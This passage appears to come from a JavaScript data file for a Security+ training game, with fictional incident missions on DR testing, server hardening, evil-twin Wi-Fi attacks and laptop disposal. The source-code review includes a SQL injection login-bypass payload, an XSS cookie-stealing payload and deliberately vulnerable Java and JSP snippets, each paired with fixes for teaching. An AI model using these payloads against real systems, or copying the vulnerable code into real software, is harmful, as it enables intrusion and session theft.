   - Battery backup for SHORT-term power loss (minutes)
   - Provides time for graceful shutdown or generator startup
   - Your datacenter: UPS rated for 15 minutes runtime
   - Last UPS test: 8 months ago

2. GENERATOR:
   - Diesel/natural gas generator for LONG-term power outages (hours to days)
   - Your datacenter: 500kW generator, fuel for 48 hours
   - Last generator test: 11 months ago (found fuel line clog during this incident investigation)

3. DUAL POWER SUPPLY:
   - Servers with two power supplies, each on different circuits
   - If one circuit fails, server stays online
   - Your environment: All critical servers have dual PSUs (properly configured)

4. PDU (Power Distribution Unit):
   - Manages power distribution to racks
   - Intelligent PDUs allow remote power cycling
   - Your environment: Standard PDUs (no remote management)

FINDING: While power resiliency is adequately designed, the lack of testing means you don\'t know if the generator would actually run for 48 hours. Same problem as DR plan: looks good on paper, not validated in practice.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the PRIMARY failure that caused the disaster recovery plan to fail?',
      options: [
        'Using RAID 5 instead of RAID 10 for database servers',
        'Not implementing a hot site instead of a warm site',
        'Failure to regularly test and validate the DR plan and backups',
        'Insufficient power resiliency with only 15-minute UPS runtime'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: RAID 5 vs RAID 10 is a performance/redundancy tradeoff for disk failures. Neither protects against ransomware encrypting the entire array. RAID level is irrelevant to this incident.',
        'INCORRECT: A hot site would have enabled faster failover, but it doesn\'t solve the core problem: the warm site was not maintained, and backups were not validated. A hot site with corrupted backups and outdated configuration would have failed just as badly (and cost 3x more).',
        'CORRECT: The DR plan failed because it was UNTESTED. Replication jobs were broken for 6 weeks (no one noticed). Backups were corrupted (no one validated them). The warm site was missing 60% of required hardware (no one audited it). Regular testing would have caught all of these issues before the disaster. A DR plan is only as good as its last successful test.',
        'INCORRECT: Power resiliency is unrelated to ransomware recovery. The 15-minute UPS runtime is adequate for generator startup. The incident was caused by ransomware, not power failure.'
      ]
    },

    debrief: `This incident covers CompTIA Objective 3.4: Resiliency and Recovery. The disaster recovery plan existed on paper but failed in practice because it was never tested.

Key concepts learned:
  - Site types: Hot (real-time, expensive), warm (periodic sync, medium cost), cold (empty, cheap)
  - Backup types: Full (all data), incremental (changes since last backup), differential (changes since last full), snapshot (point-in-time)
  - High availability: Load balancing, clustering (active-active, active-passive)
  - RAID: Protects against disk failure, NOT logical corruption or ransomware
  - Offsite/cloud backups: Critical for ransomware recovery (local backups are encrypted)
  - Recovery metrics: RTO (max downtime), RPO (max data loss), MTTR (time to repair), MTBF (time between failures)
  - Power resiliency: UPS (short-term), generator (long-term), dual supply, PDU
  - Capacity planning: Ensure DR site can handle production load
  - TESTING: DR plans must be validated regularly — untested plans fail

The lesson: "Hope is not a strategy." Test your backups. Test your DR failover. Test your recovery procedures. Quarterly.`,

    escalation: `After 22 hours of downtime, the decision is made to pay the $4.7M ransom to obtain decryption keys (decryption takes 11 additional days). Total downtime: 14 days. Revenue loss: $28M. Customer SLA penalties: $6.2M. Regulatory fines for inadequate data protection: $3.1M. The board fires the CTO and CISO. A $12M emergency project is funded to: build a hot site with real-time replication, implement immutable backups (append-only, cannot be encrypted), deploy endpoint detection and response (EDR) on all systems, and mandate quarterly DR tests with executive participation.`,

    refs: [
      { source: 'Study Guide', section: '3.4 - High Availability', page: 64 },
      { source: 'Study Guide', section: '3.4 - Site Resiliency', page: 66 },
      { source: 'Study Guide', section: '3.4 - Backups and Recovery', page: 68 },
      { source: 'Study Guide', section: '3.4 - Power and Capacity', page: 70 }
    ]
  },

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.1)
// Teaches: Secure Baselines, Hardening, Default Configurations
// ============================================================
{
  id: 'MISSION-023',
  title: 'The Golden Image Disaster',
  domain: 'Security Operations',
  objectiveCodes: ['4.1'],
  threatLevel: 'critical',
  tags: ['Hardening', 'Secure Baselines', 'Configuration Management', 'Default Passwords'],
  briefing: 'CRITICAL SECURITY AUDIT: Your compliance team just completed a security baseline audit of 47 production servers provisioned over the past 6 months. The results are catastrophic — every server was deployed from a 3-year-old golden image with no hardening applied. Default credentials remain active, unnecessary services are running, and 22 ports are open to the internet. Vulnerability scans show hundreds of missing patches. An external penetration tester compromised one server in under 8 minutes using a default administrator password. The CISO demands an immediate remediation plan.',

  intel: [
    {
      id: 'baseline-01',
      type: 'report',
      label: 'Baseline Audit Report',
      content: `SECURE BASELINE AUDIT — CRITICAL FINDINGS

What is a secure baseline? A documented, approved standard configuration that defines minimum security settings for systems. It includes: hardened OS configuration, necessary software only, current patches, disabled default accounts, closed unnecessary ports, and secure service configurations.

The baseline lifecycle:
  1. ESTABLISH — Create the standard (CIS Benchmarks, vendor guides, regulatory requirements)
  2. DEPLOY — Apply to new systems via golden images, automation scripts, or configuration management
  3. MAINTAIN — Continuously verify compliance, update for new threats, patch regularly

AUDIT FINDINGS — All 47 servers deployed from "GoldenImage_2023_v1.iso":
  ✗ Last updated: 3 years ago (contains 847 known vulnerabilities)
  ✗ Default accounts active: Administrator, root, admin (all with factory passwords)
  ✗ Unnecessary software installed: Games, media players, developer tools, print services
  ✗ Open ports: 22 (SSH), 23 (Telnet), 80 (HTTP), 135-139 (Windows file sharing), 445 (SMB), 3389 (RDP), 5900 (VNC), plus 15 more
  ✗ Services running: 47 services, only 12 are required for the application
  ✗ Windows firewall: DISABLED
  ✗ Password policy: No complexity requirements, no expiration
  ✗ No antivirus or EDR agent

This is the opposite of hardening. Instead of reducing attack surface, these systems have maximum exposure.`,
      critical: true
    },
    {
      id: 'baseline-02',
      type: 'forensic',
      label: 'Penetration Test Report',
      content: `EXTERNAL PENETRATION TEST — Executive Summary

Timeline of compromise (Server: PROD-WEB-12):
  00:00 — Port scan reveals 22 open ports
  00:45 — Telnet (port 23) found accepting connections (cleartext protocol, no encryption)
  01:30 — Brute force attack on admin account
  02:15 — Default password "Admin123!" successful
  07:45 — Full administrative access achieved
  08:00 — Domain Administrator credentials harvested from memory

Hardening targets and what was missing:

WORKSTATIONS/SERVERS:
  • Remove unnecessary software (games, media tools, dev utilities)
  • Disable unused services (print spooler, remote registry, telnet)
  • Close unnecessary ports (only allow what the application needs)
  • Change default passwords on ALL accounts
  • Enable host firewall with deny-all default policy
  • Apply latest patches
  • Install endpoint protection (antivirus, EDR)

NETWORK DEVICES (switches, routers):
  • Change default SNMP community strings ("public", "private")
  • Disable unused ports and protocols
  • Enable port security (MAC address filtering)
  • Use SSH instead of Telnet for management

EMBEDDED SYSTEMS / SCADA / ICS:
  • Isolate on dedicated VLAN (OT network separate from IT)
  • Change default credentials (often overlooked on PLCs, HMIs, RTUs)
  • Disable remote access unless absolutely required
  • Apply vendor security patches (if available — many ICS systems can't be patched)

The tester found 18 different default passwords across various services on these servers.`,
      critical: true
    },
    {
      id: 'baseline-03',
      type: 'log',
      label: 'Configuration Management History',
      content: `DEPLOYMENT TIMELINE ANALYSIS:

2023-01-15: Golden image "GoldenImage_2023_v1.iso" created from Windows Server 2019 base install
  - Initial hardening applied (CIS Level 1 benchmark)
  - Image stored in repository

2023-02 through 2025-11: Image used to provision 47 production servers
  - NO updates to the golden image
  - NO post-deployment hardening scripts
  - NO verification of baseline compliance

Problem: The establish phase happened once (3 years ago). The maintain phase never happened.

PROPER BASELINE MAINTENANCE:
  • Quarterly reviews of baseline configuration
  • Monthly patch updates to the golden image
  • Post-deployment automation (Ansible, Puppet, Chef) to apply latest hardening
  • Continuous compliance scanning to detect drift
  • Version control for baseline configurations
  • Change management approval for any baseline modifications

CLOUD INFRASTRUCTURE hardening (also missed):
  • Security group rules (principle of least privilege)
  • IAM policies (no wildcard permissions)
  • Encryption at rest and in transit
  • Public access blocks on storage
  • Logging and monitoring enabled
  • MFA enforced on all accounts

Your team deployed systems from a stale image and never verified compliance. Drift from the baseline went undetected for years.`,
      critical: false
    },
    {
      id: 'baseline-04',
      type: 'intercepted',
      label: 'Threat Intelligence',
      content: `THREAT ACTOR RECONNAISSANCE DETECTED

External IP 185.44.72.201 (known threat actor infrastructure) performed the following against your public IP ranges:

  Day 1: Port scans across entire /24 subnet
  Day 2: Service enumeration on discovered open ports
  Day 3: Credential brute force attempts on Telnet and RDP
  Day 4: Successful authentication to 3 servers using default credentials

Indicators suggest automated exploitation framework (likely Metasploit or similar). The attacker is systematically targeting systems with:
  • Default credentials
  • Outdated software versions
  • Unnecessary services (Telnet, FTP, VNC)
  • Open remote access ports

ATTACK SURFACE: Each unnecessary service, open port, or default password is a potential entry point. Hardening reduces attack surface by removing everything that's not explicitly required.

PRINCIPLE: Start with deny-all, explicitly allow only what's needed. The opposite approach (allow everything, block known threats) is called "blacklisting" and always fails — you can't enumerate every possible threat.`,
      critical: false
    },
    {
      id: 'baseline-05',
      type: 'alert',
      label: 'CIS Benchmark Comparison',
      content: `CIS BENCHMARK COMPLIANCE SCAN

What is CIS? The Center for Internet Security publishes detailed hardening benchmarks for operating systems, cloud platforms, network devices, and applications. These are industry-standard secure baselines.

Compliance scan results for Windows Server 2019:
  • Total controls: 247 settings
  • Compliant: 14 (6%)
  • Non-compliant: 233 (94%)

Critical failures:
  ✗ Account lockout threshold: DISABLED (should be 5 failed attempts)
  ✗ Password minimum length: 0 characters (should be 14+)
  ✗ Guest account: ENABLED (should be disabled)
  ✗ Remote Desktop: ALLOWED from any IP (should be restricted to jump hosts)
  ✗ SMB v1: ENABLED (deprecated protocol with known exploits)
  ✗ LLMNR/NetBIOS: ENABLED (vulnerable to man-in-the-middle attacks)
  ✗ PowerShell logging: DISABLED (can't detect malicious scripts)
  ✗ Windows Defender: DISABLED
  ✗ Automatic updates: DISABLED

MOBILE DEVICE hardening (for reference):
  • MDM enrollment required
  • Full-disk encryption enforced
  • Screen lock timeout (2 minutes max)
  • Biometric or strong PIN required
  • Remote wipe capability enabled
  • App installation restricted to approved sources
  • Jailbreak/root detection

RTOS (Real-Time Operating Systems) in embedded devices:
  • Often lack security features (no user accounts, no encryption)
  • Hardening focuses on network isolation and physical security
  • Change any hardcoded credentials in firmware`,
      critical: false
    }
  ],

  challenge: {
    question: 'Based on the audit findings, what is the FIRST step to remediate this baseline failure?',
    options: [
      'Rebuild the golden image with current patches and hardening, then redeploy all 47 servers',
      'Create a new hardened baseline, update the golden image, and establish a quarterly maintenance schedule',
      'Purchase a third-party configuration management tool to automate baseline enforcement',
      'Perform penetration testing on every server to identify additional vulnerabilities'
    ],
    correctIndex: 1,
    rationales: [
      'INCORRECT: Rebuilding immediately without addressing the process failure will lead to the same problem in the future. You need to establish a MAINTENANCE schedule to keep the baseline current, not just fix it once.',
      'CORRECT: The root cause is the lack of a baseline maintenance process. You must 1) ESTABLISH a new hardened baseline (using CIS Benchmarks), 2) DEPLOY it via an updated golden image, and 3) MAINTAIN it with regular reviews and updates. This addresses all three phases of the baseline lifecycle.',
      'INCORRECT: Automation tools are valuable but they\'re a solution to implement AFTER you\'ve established a proper baseline and maintenance process. The tool doesn\'t define what "secure" means — your baseline documentation does.',
      'INCORRECT: Pen testing is valuable for validation but doesn\'t remediate anything. The audit already identified the problems (default passwords, open ports, missing patches). Testing every server individually would take weeks and wouldn\'t fix the systemic process failure.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objective 4.1: Secure Baselines and Hardening. A secure baseline is a documented standard configuration that must be ESTABLISHED (created), DEPLOYED (applied to systems), and MAINTAINED (kept current).

Key concepts learned:
  - Hardening = reducing attack surface by removing unnecessary software, services, and ports
  - Default passwords are the #1 initial access vector — change them ALL
  - Golden images must be updated regularly or they become vulnerability sources
  - CIS Benchmarks provide industry-standard hardening guidance
  - Hardening targets: workstations, servers, mobile devices, network devices, cloud infrastructure, SCADA/ICS, embedded systems, RTOS
  - Baseline maintenance requires continuous compliance monitoring and regular updates
  - The three-phase lifecycle: establish → deploy → maintain

A stale golden image is worse than no image at all — it systematically deploys known vulnerabilities.`,

  escalation: `Without immediate action, the 47 vulnerable servers remain in production. Two weeks later, the threat actor from the reconnaissance activity returns. Using default credentials on Telnet, they compromise 12 servers and deploy ransomware across the entire environment. The attack encrypts 340 production systems (pivoting from the initial 12). Recovery takes 18 days. Total cost: $4.7M in downtime, $900K ransom payment (paid to restore critical systems faster), and $1.2M in incident response and forensic investigation. The breach triggers mandatory disclosure under state data protection laws.`,

  refs: [
    { source: 'Study Guide', section: '4.1 - Secure Baselines', page: 63 },
    { source: 'Study Guide', section: '4.1 - Hardening Targets', page: 65 },
    { source: 'Study Guide', section: '4.8 - CIS Benchmarks', page: 82 }
  ]
},

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.1)
// Teaches: Wireless Security, MDM, WPA2/WPA3, 802.1X, BYOD
// ============================================================
{
  id: 'MISSION-024',
  title: 'The Rogue Signal',
  domain: 'Security Operations',
  objectiveCodes: ['4.1'],
  threatLevel: 'high',
  tags: ['Wireless', 'WPA3', '802.1X', 'MDM', 'Rogue AP', 'BYOD'],
  briefing: 'SECURITY INCIDENT: A routine wireless site survey discovered an unauthorized access point broadcasting your corporate SSID "CorpNet-Secure" from inside the building. Twenty-three employee devices have connected to it in the past 48 hours, including 7 executive smartphones. The rogue AP is performing a man-in-the-middle attack, intercepting credentials and session tokens. Your investigation reveals that the corporate wireless network uses WPA2-PSK (a single shared password) and has no MDM or NAC solution deployed. The CISO wants to know how this happened and what enterprise-grade wireless security should look like.',

  intel: [
    {
      id: 'wireless-01',
      type: 'alert',
      label: 'Wireless Intrusion Detection Alert',
      content: `ROGUE ACCESS POINT DETECTED

Authorized AP: CorpNet-Secure (BSSID: 00:1A:2B:3C:4D:5E)
Rogue AP:      CorpNet-Secure (BSSID: AA:BB:CC:DD:EE:FF) ← UNAUTHORIZED

Attack type: Evil Twin — An attacker sets up a fake access point with the same SSID as the legitimate network. Client devices see two networks with identical names and connect to whichever has the stronger signal. The attacker positioned the rogue AP near the executive conference room where signal strength is higher.

Why WPA2-PSK is vulnerable:
  • PSK = Pre-Shared Key (a single password shared by everyone)
  • Once the password is known, ANYONE can create an AP using that SSID and PSK
  • Clients authenticate to the PSK, not to the specific AP hardware
  • No way to distinguish legitimate APs from rogue ones with the same PSK
  • Employee turnover means the PSK is known by hundreds of current and former employees

WIRELESS SECURITY MODES:
  1. OPEN — No encryption, no authentication (public WiFi)
  2. WPA2-PSK / WPA3-PSK — Shared password mode (Personal)
  3. WPA2-Enterprise / WPA3-Enterprise — Individual user authentication via 802.1X (best for corporate)

Your network uses WPA2-PSK — appropriate for home networks, NOT for enterprise environments.`,
      critical: true
    },
    {
      id: 'wireless-02',
      type: 'forensic',
      label: 'Packet Capture Analysis',
      content: `NETWORK TRAFFIC ANALYSIS — Rogue AP Activity

Captured credentials from 23 devices that connected to the rogue AP:
  • 14 Active Directory usernames and passwords (captured during initial connection to internal resources)
  • 7 VPN credentials
  • 18 session tokens for cloud applications (Office 365, Salesforce, AWS Console)
  • Full cleartext HTTP traffic (unencrypted internal web apps)

Why 802.1X Enterprise prevents this:

WPA2/WPA3-ENTERPRISE mode uses 802.1X authentication:
  1. User connects to wireless → AP challenges for credentials
  2. AP forwards credentials to RADIUS server (central authentication)
  3. RADIUS checks against Active Directory / LDAP
  4. RADIUS approves or denies → AP allows or blocks connection
  5. RADIUS provides unique encryption keys to each client (no shared PSK)

Critical difference: Every user has INDIVIDUAL credentials. A rogue AP can't authenticate users without access to the RADIUS server. Even if the attacker knows one user's credentials, they can't create a functioning evil twin because they can't replicate the RADIUS authentication backend.

EAP (Extensible Authentication Protocol) types used with 802.1X:
  • EAP-TLS — Certificate-based (most secure, requires PKI)
  • PEAP — Protected EAP with server certificate + username/password
  • EAP-TTLS — Similar to PEAP, tunnels authentication
  • EAP-FAST — Cisco proprietary, uses PACs (Protected Access Credentials)

Your organization has a RADIUS server for VPN authentication but never configured it for wireless.`,
      critical: true
    },
    {
      id: 'wireless-03',
      type: 'report',
      label: 'Wireless Security Architecture Review',
      content: `RECOMMENDED WIRELESS ARCHITECTURE — Enterprise Security

AUTHENTICATION: WPA3-Enterprise with 802.1X
  • WPA3 improvements over WPA2:
    - SAE (Simultaneous Authentication of Equals) replaces PSK handshake
    - Protects against offline dictionary attacks
    - Forward secrecy (past sessions can't be decrypted even if password is later compromised)
    - GCMP (Galois/Counter Mode Protocol) encryption instead of CCMP (stronger cipher)
    - Protected Management Frames (PMF) — prevents deauth attacks
  • Individual user authentication via RADIUS
  • Certificate-based device authentication (EAP-TLS) for highest security
  • Network Access Control (NAC) to verify device health before granting access

MOBILE DEVICE MANAGEMENT (MDM):
  • Enforce wireless security policies on all mobile devices
  • Auto-configure 802.1X certificates (users don't manually install)
  • Require full-disk encryption
  • Remote wipe capability for lost/stolen devices
  • Geofencing (restrict certain apps/data based on location)
  • Application whitelisting (only approved apps can install)

DEPLOYMENT MODELS:
  • BYOD (Bring Your Own Device) — Employees use personal phones/laptops. MDM creates separate work profile. Highest flexibility, lowest control.
  • COPE (Corporate Owned, Personally Enabled) — Company provides device, employees can use for personal activities. Moderate control.
  • CYOD (Choose Your Own Device) — Employees pick from approved device list, company purchases. Company maintains full control.

Your current state: Unmanaged BYOD with no MDM = maximum risk.`,
      critical: false
    },
    {
      id: 'wireless-04',
      type: 'log',
      label: 'Wireless Site Survey Report',
      content: `SITE SURVEY FINDINGS

What is a wireless site survey? A physical assessment of wireless coverage, signal strength, interference, and security. Uses tools to map AP placement, identify dead zones, detect rogue devices, and optimize channel assignments.

Survey results:
  • 12 authorized access points detected
  • 1 rogue access point (the evil twin)
  • 3 neighboring networks on overlapping channels (interference)
  • 4 areas with inadequate coverage (employees likely to use personal hotspots)
  • Signal bleed outside building perimeter (exploitable from parking lot)

ADDITIONAL WIRELESS SECURITY CONCERNS:

Bluetooth:
  • All 47 conference room displays have Bluetooth enabled with default PINs
  • Vulnerable to BlueBorne attacks (remote code execution over Bluetooth)
  • Recommendation: Disable Bluetooth on all IoT devices unless required

Cellular (mobile devices):
  • IMSI catchers (Stingray devices) can intercept cellular traffic
  • MDM can enforce VPN-on-cellular policies
  • Some mobile threats: SMS phishing, malicious apps, OS vulnerabilities

WiFi-specific attacks detected in logs:
  • 47 deauthentication packets sent to force clients to reconnect (to the rogue AP)
  • WPS (WiFi Protected Setup) enabled on 2 APs — vulnerable to brute force PIN attacks
  • SSID broadcast: Your SSID is visible. Hiding SSID provides no real security (clients still broadcast it in probe requests) but does reduce casual discovery.

Recommendation: Deploy wireless IDS/IPS (Intrusion Detection/Prevention) to detect and automatically mitigate rogue APs, deauth attacks, and evil twins.`,
      critical: false
    },
    {
      id: 'wireless-05',
      type: 'witness',
      label: 'Executive Interview',
      content: `Interview with CFO (one of the 7 executives compromised):

"I was in the conference room for a budget meeting when my phone asked me to re-enter the WiFi password. I typed in the corporate password we all use — 'CorpSecure2024!' — and it connected normally. I didn't think anything of it."

"Later that day I got a notification from my bank that someone tried to access my account from Romania. I use the same password for the corporate WiFi and my bank account."

This highlights multiple failures:
  1. Shared PSK instead of individual 802.1X authentication
  2. No certificate pinning to verify AP legitimacy
  3. No MDM to auto-provision secure wireless configuration
  4. User credential reuse across work and personal accounts (password hygiene failure)
  5. No user training on rogue AP indicators

Interview with IT Manager:

"We looked into WPA2-Enterprise with 802.1X a few years ago but decided it was 'too complex' for users. The RADIUS server configuration, certificate deployment, user support tickets... we went with a simple shared password instead. In hindsight, that was a massive mistake."

Lesson: Enterprise security has complexity costs, but the alternative (shared passwords, no device management) has much higher risk costs.`,
      critical: false
    }
  ],

  challenge: {
    question: 'To prevent this rogue AP attack from succeeding in the future, what is the MOST effective technical control?',
    options: [
      'Increase the transmit power of authorized APs so they always have stronger signal than rogue devices',
      'Deploy WPA3-Enterprise with 802.1X authentication using a RADIUS server',
      'Change the WPA2-PSK password monthly and distribute it only to approved employees',
      'Hide the SSID so attackers can\'t discover the network name'
    ],
    correctIndex: 1,
    rationales: [
      'INCORRECT: Signal strength won\'t stop an evil twin attack. An attacker can always place a rogue AP physically closer to targets (near high-value areas) to achieve stronger signal. This is an arms race you can\'t win.',
      'CORRECT: WPA3-Enterprise with 802.1X uses individual user authentication against a central RADIUS server. A rogue AP can\'t authenticate users without access to the RADIUS backend, even if it broadcasts the correct SSID. Each client also receives unique encryption keys, eliminating the shared PSK vulnerability. This fundamentally prevents evil twin attacks.',
      'INCORRECT: Rotating a shared PSK doesn\'t solve the problem — it\'s still a shared password. Anyone with the password (employees, contractors, former staff) can create a rogue AP. Monthly rotation also creates operational burden and user frustration without addressing the root issue.',
      'INCORRECT: Hiding the SSID (disabling broadcast) provides minimal security. Client devices still broadcast the SSID in probe requests when searching for known networks, revealing the name to anyone sniffing wireless traffic. Attackers already know your SSID from previous reconnaissance.'
    ]
  },

  debrief: `This incident demonstrates CompTIA Objective 4.1: Wireless Security. The rogue access point succeeded because the network used WPA2-PSK (shared password) instead of enterprise-grade authentication.

Key concepts learned:
  - WPA2-PSK vs WPA3-PSK: Personal mode with shared password (home/small office use)
  - WPA2-Enterprise vs WPA3-Enterprise: Individual authentication via 802.1X and RADIUS (corporate use)
  - WPA3 improvements: SAE handshake, GCMP encryption, forward secrecy, Protected Management Frames
  - 802.1X: Network access control using RADIUS for authentication
  - EAP: Protocol for carrying authentication (EAP-TLS, PEAP, EAP-TTLS)
  - MDM: Manages mobile device security policies, auto-configures certificates, enforces encryption
  - BYOD/COPE/CYOD: Deployment models with different ownership and control levels
  - Wireless site surveys detect rogue APs, coverage gaps, and interference
  - Evil twin attacks exploit shared credentials and lack of AP authentication

Enterprise wireless requires individual user authentication, not shared passwords.`,

  escalation: `The rogue AP ran undetected for 48 hours. In that time, the attacker captured credentials for 23 employees, including 7 executives. Using the CFO's compromised credentials, the attacker accessed the financial system and initiated 3 fraudulent wire transfers totaling $340,000. Two were blocked by the bank's fraud detection, but one cleared. The company must now disclose a data breach affecting 23 employees under state privacy laws. The incident also triggers a mandatory security audit by the company's cyber insurance provider, resulting in a 40% premium increase due to the lack of enterprise wireless security controls.`,

  refs: [
    { source: 'Study Guide', section: '4.1 - Wireless Security', page: 66 },
    { source: 'Study Guide', section: '4.1 - Mobile Solutions (MDM)', page: 68 },
    { source: 'Study Guide', section: '2.4 - Wireless Attacks', page: 35 }
  ]
},

// ============================================================
// DOMAIN 4 — Security Operations (Obj 4.1 / 4.2)
// Teaches: Asset Management, Secure Coding, Sanitization, Certificate of Destruction
// ============================================================
{
  id: 'MISSION-025',
  title: 'The Decommissioned Laptop',
  domain: 'Security Operations',
  objectiveCodes: ['4.1', '4.2'],
  threatLevel: 'high',
  tags: ['Asset Management', 'Data Sanitization', 'Secure Disposal', 'Application Security'],
  briefing: 'INCIDENT ALERT: Your security team received an anonymous tip that a laptop belonging to a former employee is being sold on eBay — with the company asset tag still visible in the photos. When the IT asset manager checked records, the device was never returned during the employee\'s offboarding 8 months ago. The security team purchased the laptop as evidence. Forensic analysis recovered 47GB of unencrypted company data from the drive, including customer PII, financial records, and source code for a proprietary application. The source code review revealed multiple security vulnerabilities. The CISO demands answers: how did this happen, and what asset management controls failed?',

  intel: [
    {
      id: 'asset-01',
      type: 'forensic',
      label: 'Forensic Recovery Report',
      content: `DIGITAL FORENSICS ANALYSIS — Recovered Laptop

Asset Tag: CORP-LAP-2847
Assigned to: Michael Torres (Developer) — Terminated 8 months ago
Drive: 512GB SSD, NO encryption, NOT wiped

Data recovered (unencrypted):
  • 47GB of company files
  • Customer database export (42,000 records with PII: names, emails, SSNs, payment card data)
  • Proprietary application source code (Java backend, React frontend)
  • Internal network diagrams and credentials stored in plaintext text files
  • Email archive (8,400 emails via IMAP cache)

ASSET MANAGEMENT LIFECYCLE (what should have happened):
  1. PROCUREMENT — Device purchased, received, tagged with asset ID
  2. ASSIGNMENT — Device assigned to employee, tracked in asset database
  3. TRACKING — Regular inventory audits to verify location and condition
  4. ENUMERATION — Automated discovery tools scan network for all devices
  5. DECOMMISSIONING — Employee returns device during offboarding
  6. MEDIA SANITIZATION — Data is securely erased (see sanitization methods below)
  7. CERTIFICATE OF DESTRUCTION — Third-party provides documentation that device was destroyed or data was irretrievably wiped

What actually happened: Torres never returned the laptop. Offboarding checklist wasn't enforced. Asset database showed "ASSIGNED" status 8 months after termination.

MEDIA SANITIZATION methods (in order of security):
  • DESTRUCTION — Physical destruction (shred, incinerate, degauss magnetic media). Most secure. Certificate of destruction proves compliance.
  • PURGING — Cryptographic erase or overwrite multiple times (DoD 5220.22-M standard: 7-pass overwrite). Secure for data retention compliance.
  • CLEARING — Single-pass overwrite or quick format. NOT secure — data recoverable with forensic tools.

This device received ZERO sanitization.`,
      critical: true
    },
    {
      id: 'asset-02',
      type: 'log',
      label: 'Asset Management System Audit',
      content: `ASSET TRACKING DATABASE REVIEW

Total assets in system: 847 devices (laptops, workstations, tablets, phones)

Concerning findings:
  • 47 devices marked "ASSIGNED" to employees who left the company 6+ months ago
  • 22 devices with no assigned owner ("UNASSIGNED" status but physically missing)
  • 14 devices past data retention policy deadline (3 years) still in storage with data intact
  • No automated alerts for overdue returns
  • No integration with HR offboarding workflow
  • Manual asset audits conducted every 18 months (last audit was 19 months ago)

PROPER ASSET MANAGEMENT:
  • Automated asset discovery (network scanning, endpoint agents, CMDB integration)
  • Integration with HR systems (automatic offboarding workflow triggers asset return task)
  • 30-day return deadline after termination, escalation to legal if not met
  • Quarterly physical inventory audits (match physical devices to database)
  • Geolocation tracking on mobile devices (MDM-enabled)
  • Automated decommissioning after data retention period expires

DATA RETENTION POLICY (not followed):
  • Financial records: 7 years (regulatory requirement)
  • Email: 3 years
  • Project files: 2 years after project closure
  • After retention period: MANDATORY sanitization and certificate of destruction

The laptop contained email and project files well past their retention deadlines — should have been sanitized years ago even if the device was still in use.`,
      critical: true
    },
    {
      id: 'asset-03',
      type: 'report',
      label: 'Source Code Security Analysis',
      content: `APPLICATION SECURITY REVIEW — Recovered Source Code

The recovered source code for "CustomerPortal" application contains multiple severe vulnerabilities:

1. SQL INJECTION — Customer login form (login.java):
   String query = "SELECT * FROM users WHERE username='" + request.getParameter("username") + "' AND password='" + request.getParameter("password") + "'";

   Problem: NO INPUT VALIDATION. User input is directly concatenated into SQL query.
   Attack: An attacker can input: username = admin' OR '1'='1
   Result: Authentication bypass, full database access

   FIX: Use parameterized queries / prepared statements:
   PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=? AND password=?");
   stmt.setString(1, username);
   stmt.setString(2, password);

2. CROSS-SITE SCRIPTING (XSS) — Display user profile (profile.jsp):
   <h1>Welcome, <%= request.getParameter("name") %></h1>

   Problem: User input rendered directly in HTML with no sanitization
   Attack: name parameter = <script>alert(document.cookie)</script>
   Result: Session hijacking, credential theft

   FIX: HTML encode all user input before rendering

3. INSECURE SESSION MANAGEMENT — Cookies not secured (app.config):
   session.cookie.secure = false
   session.cookie.httpOnly = false

   Problem: Cookies transmitted over HTTP (unencrypted), accessible via JavaScript
   Attack: Man-in-the-middle captures session token, XSS steals cookie
   Result: Session hijacking

   FIX: Set secure=true (HTTPS only) and httpOnly=true (not accessible to JavaScript)

SECURE DEVELOPMENT LIFECYCLE controls that were missing:
  • INPUT VALIDATION — Whitelist acceptable characters, validate data types, enforce length limits
  • SAST (Static Application Security Testing) — Automated source code analysis to find vulnerabilities before deployment
  • DYNAMIC ANALYSIS / FUZZING — Send malformed inputs to find crashes and vulnerabilities
  • CODE SIGNING — Digital signatures prove code authenticity and integrity
  • SANDBOXING — Run untrusted code in isolated environments

Because the source code leaked, attackers now have a blueprint for exploiting the production application.`,
      critical: false
    },
    {
      id: 'asset-04',
      type: 'witness',
      label: 'Offboarding Process Interview',
      content: `Interview with HR Manager:

"Our offboarding checklist has a line item for 'Return company property' but there's no enforcement mechanism. The manager is supposed to ensure the employee returns their laptop, phone, badge, and keys. But if the employee ghosts us or refuses, we don't have a process to escalate. We definitely don't have integration between the HR system and the IT asset database."

"In Torres's case, his manager confirmed offboarding was complete and he left the company on good terms. No one followed up to verify he actually returned the laptop. The manager assumed he did. Eight months later, here we are."

Interview with IT Asset Manager:

"I don't have visibility into who leaves the company unless HR manually tells me. I run a report every 18 months to reconcile assets, but that's not frequent enough. We also don't have any kind of remote wipe capability on laptops — only on mobile devices via MDM."

"For data sanitization, we use DBAN (Darik's Boot and Nuke) to wipe drives on devices we get back. It does a 3-pass overwrite. For devices we dispose of, we contract with an e-waste company that provides a certificate of destruction certifying the drives were physically destroyed. But we can't sanitize a device we don't have."

LESSON: Technology controls (remote wipe, MDM, automated alerts) must integrate with HR processes (offboarding workflows, termination notifications) for asset management to work.`,
      critical: false
    },
    {
      id: 'asset-05',
      type: 'alert',
      label: 'Compliance Impact Assessment',
      content: `REGULATORY COMPLIANCE VIOLATIONS

The recovered data triggers multiple compliance failures:

1. PCI DSS (Payment Card Industry Data Security Standard):
   • Unencrypted cardholder data stored on endpoint device (Requirement 3.4 violation)
   • No device inventory or tracking (Requirement 12.3 violation)
   • Mandatory incident response: Notify card brands, potential fines $5,000-$100,000 per month of non-compliance

2. GDPR (General Data Protection Regulation):
   • Inadequate technical measures to protect personal data (Article 32 violation)
   • 42,000 EU residents' PII exposed
   • Mandatory breach notification within 72 hours (already past deadline due to delayed discovery)
   • Potential fine: Up to €20 million or 4% of annual global revenue

3. SOX (Sarbanes-Oxley Act):
   • Financial records not properly safeguarded
   • Inadequate asset management controls
   • Potential criminal penalties for executives

CERTIFICATE OF DESTRUCTION importance:
   • Legal proof that regulated data was destroyed per policy
   • Required for PCI DSS, HIPAA, GDPR compliance audits
   • Protects against liability if third-party disposal vendor fails to properly destroy media
   • Should document: asset ID, serial number, destruction method, date, witness signature

The absence of certificates of destruction for 14 devices past retention deadlines is a compliance audit failure even without the eBay incident.`,
      critical: false
    }
  ],

  challenge: {
    question: 'What control would have MOST effectively prevented company data from being recoverable on the laptop sold on eBay?',
    options: [
      'Implement full-disk encryption on all endpoint devices',
